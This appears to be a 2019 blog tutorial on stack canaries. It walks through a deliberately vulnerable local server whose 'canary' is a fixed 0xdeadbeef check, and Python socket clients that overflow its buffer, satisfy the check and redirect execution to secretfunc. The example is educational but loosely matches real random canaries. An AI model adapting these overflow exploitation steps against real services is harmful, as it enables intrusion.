---
layout: post
title: "Stack Canaries"
date: "2019-08-20 20:12:10"
comments: false
draft: false
categories:
- hacking
tags:
- exploit
- hacking
---

A popular buffer overflow prevention technique employed by some programs.

> Used to detect a stack buffer overflow before execution of malicious code can occur, by placing a small integer, the value of which is randomly chosen at program start, in memory just before the stack return pointer. Most buffer overflows overwrite memory from lower to higher memory addresses, so in order to overwrite the return pointer, the canary value must also be overwritten. This value is checked to make sure it has not changed before a routine uses the return pointer on the stack. This technique can greatly increase the difficulty of exploiting a stack buffer overflow because it forces the attacker to gain control of the instruction pointer by corrupting other important variables on the stack.

In a nutshell involves validating the value of variables on the stack. Here is a concrete example of a stack canary:

    void overflowme(char *str) {
        unsigned int val;
        char buf[4] = {0};
    
        memorycopy(buf, str, 16);
        printf("  [+] val=%x\n", val);
        if (val == 0xdeadbeef) {
            strcopy(buf, str);
        }
    }

If the `0xdeadbeef` check fails, the overflow can't be triggered. Running the server:

    # ./bin/server
    [+] Server is starting...
    [+] Server is now listening on 8888
    [+] secretfunc is @ 0x8048d83
    [+] Awaiting clients...

To trigger `secretfunc` using by overflowing the stack, need to also now also get pass the `0xdeadbeef` check.

Using our trusty python client, let overflow the 4 byte buffer, by filling it with 8 bytes:

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 8888))
buf="ABCDEFGH"
s.send(buf)
```

The output of the vulnerable server program:

      [+] (Client 4) Connected
    Printing:You are client 4
      [+] (Client 4) Sent us 8 bytes
      [+] (Client 4) Sent us 'ABCDEFGH'
      [+] val=48474645

Can see the buffer has bled into the unsigned int `val`.

    unsigned int val;
    char buf[4] = {0};
    printf("  [+] val=%x\n", val);
    if (val == 0xdeadbeef) {

With the 8 byte overflow were able to set `val` to the value of `0x48474645`.

    Char  Dec  Oct  Hex
    A      65 0101 0x41
    B      66 0102 0x42
    C      67 0103 0x43
    D      68 0104 0x44
    E      69 0105 0x45
    F      70 0106 0x46
    G      71 0107 0x47
    H      72 0110 0x48
    I      73 0111 0x49

This looks to be the `EFGH` characters in the 8 byte overflow python client. That means immediately after the first 4 bytes, the unsigned integer is loaded up with the very next 4 bytes (given it can hold 32 bits!). Given this we just need to pack the `0xdeadbeef` bits in straight after the first 4 bytes of the buffer, or just after `ABCD`. After that can proceed to flood the buffer with the address location of `secretfunc` in the hope of overflowing that address into the instruction pointer (`EIP`).

Python's `struct.pack` is brilliant here, as it will pack the bits within the bytes in the specified order, in this case [little endian](https://en.wikipedia.org/wiki/Endianness#Little-endian) ordering indicated with the `<I` style notation.

```python
import socket
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 8888))
buf="ABCD"
buf += struct.pack('<I', 0xdeadbeef)
buf += struct.pack('<I', 0x8048d83)
buf += struct.pack('<I', 0x8048d83)
buf += struct.pack('<I', 0x8048d83)
buf += struct.pack('<I', 0x8048d83)
s.send(buf)
```

Running this the updated python client, can see the canary is now satisfied, and control flow of the program is taken over as it proceeds to run `secretfunc` (outputs `You win!!!`).

    [+] Awaiting clients...
    [+] (Client 4) Connected
    Printing:You are client 4
      [+] (Client 4) Sent us 52 bytes
      [+] (Client 4) Sent us 'ABCDﾭރ����������'
      [+] val=deadbeef
    	You win!!!!!!!!!!!!!!!!!!
    	You win!!!!!!!!!!!!!!!!!!
    	You win!!!!!!!!!!!!!!!!!!
    	You win!!!!!!!!!!!!!!!!!!
    	Segmentation fault

